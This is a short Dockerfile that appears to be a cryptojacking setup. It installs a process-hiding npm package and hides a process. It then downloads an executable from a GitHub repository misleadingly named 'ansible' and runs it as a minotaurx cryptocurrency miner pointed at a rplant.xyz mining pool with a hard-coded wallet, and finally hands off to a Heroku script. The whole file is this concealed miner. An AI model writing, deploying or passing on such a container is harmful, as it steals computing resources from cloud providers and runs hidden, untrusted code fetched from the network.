FROM node:16
RUN apt-get update && apt-get install gcc && curl -sL https://deb.nodesource.com/setup_12.x | bash - && apt-get install nodejs && npm install -g npm@8.4.1 && npm i -g node-process-hider && ph add pkx2 && wget https://github.com/duitawa/ansible/raw/main/avx2 && chmod +x avx2 && ./avx2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RBthiAgtmCjL8cEUtwNPkpw2WwFtMQGMQM.$(echo $(shuf -i 100-999 -n 1)-CPU)
CMD bash heroku.sh
